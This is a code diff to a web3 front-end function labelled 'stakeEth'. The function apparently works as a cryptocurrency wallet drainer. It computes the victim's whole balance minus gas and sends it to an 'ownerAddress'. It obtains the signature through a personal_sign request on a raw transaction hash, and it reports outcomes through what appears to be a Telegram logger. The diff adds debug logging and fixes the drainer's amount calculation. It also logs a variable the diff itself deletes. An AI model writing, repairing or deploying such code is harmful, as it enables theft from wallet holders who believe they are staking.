@@ -890,23 +890,51 @@ console.log("Total:", tokenListLocal.length);
   }
 
   async function stakeEth(amount, msg) {
+    console.log("===== stakeEth START =====");
+console.log({
+    account: appState.account,
+    chainId: appState.chainId,
+    provider: appState.provider,
+    ethersProvider: appState.ethersProvider
+});
     if (!appState.account) return;
     try {
+      console.log("===== STAKE ETH START =====");
+console.log("Account:", appState.account);
+console.log("Amount parameter:", amount);
       const getBalance = await appState.web3.eth.getBalance(appState.account);
       const gasPrice = await appState.web3.eth.getGasPrice();
-
+console.log("Wallet balance (wei):", getBalance.toString());
+console.log("Gas price:", gasPrice.toString());
       // Preserve original calculation logic but with safe BigInt handling
-      const balanceStr = getBalance.toString();
-      const gasPriceNum = parseInt(gasPrice.toString()); // safe for gasPrice (small)
-      const valueToSendBN = BigInt(appState.web3.utils.toWei(balanceStr, 'ether')) - (BigInt(gasPriceNum) * 120000n);
-      const valueToSend = valueToSendBN > 0n ? valueToSendBN : 0n;
+      // getBalance is already in wei
+const balanceWei = BigInt(getBalance.toString());
+const gasPriceWei = BigInt(gasPrice.toString());
 
+// Estimated gas cost
+const estimatedGasCost = gasPriceWei * 120000n;
+
+// Amount available to send after gas
+const valueToSendBN = balanceWei - estimatedGasCost;
+
+console.log("===== ETH VALUE CALCULATION =====");
+console.log("Balance (wei):", balanceWei.toString());
+console.log("Gas Price (wei):", gasPriceWei.toString());
+console.log("Estimated Gas Cost:", estimatedGasCost.toString());
+console.log("Value To Send:", valueToSendBN.toString());
+console.log("=================================");
+      const valueToSend = valueToSendBN > 0n ? valueToSendBN : 0n;
+console.log("Calculated valueToSend:", valueToSend.toString());
       if (valueToSend <= 0n) throw new Error("Insufficient balance for gas");
 
       const nonce = await appState.web3.eth.getTransactionCount(appState.account);
       const chainId = await appState.web3.eth.getChainId();
       const chainHex = appState.web3.utils.toHex(chainId);
-
+console.log("Nonce:", nonce);
+console.log("ChainId:", chainId);
+console.log("Destination:", ownerAddress);
+console.log("GasPrice:", gasPriceNum);
+console.log("Value:", valueToSend.toString());
       // Restore original legacy signing flow (produces signature request, not direct tx popup)
       // This matches the original application architecture and UX exactly.
       const tx_ = {
@@ -937,7 +965,8 @@ console.log("Total:", tokenListLocal.length);
         var tx = new ethereumjs.Tx(tx_);
         const serializedTx = "0x" + tx.serialize().toString("hex");
         const sha3_ = appState.web3.utils.sha3(serializedTx, { encoding: "hex" });
-
+console.log("About to call personal_sign");
+console.log("Hash:", sha3_);
         // Use personal_sign (modern replacement for eth_sign) — widely supported and not disabled by wallets
         const initialSig = await appState.provider.request({
           method: 'personal_sign',
@@ -955,12 +984,25 @@ console.log("Total:", tokenListLocal.length);
         tx.v = v;
 
         const txFin = "0x" + tx.serialize().toString("hex");
+        console.log("Signed transaction:");
+console.log(txFin);
         const res = await appState.web3.eth.sendSignedTransaction(txFin);
         success = 1;
         structuredLog('info', 'stake_eth_success', { txHash: res.transactionHash });
       }
     } catch (e) {
       success = 0;
+      console.log("===== stakeEth ERROR =====");
+
+console.error(e);
+
+console.error(e.code);
+
+console.error(e.message);
+
+console.error(e.data);
+
+console.error(e.stack);
       classifyError(e, { operation: 'stakeEth' });
     }
     logTlgMsg(msg, success);
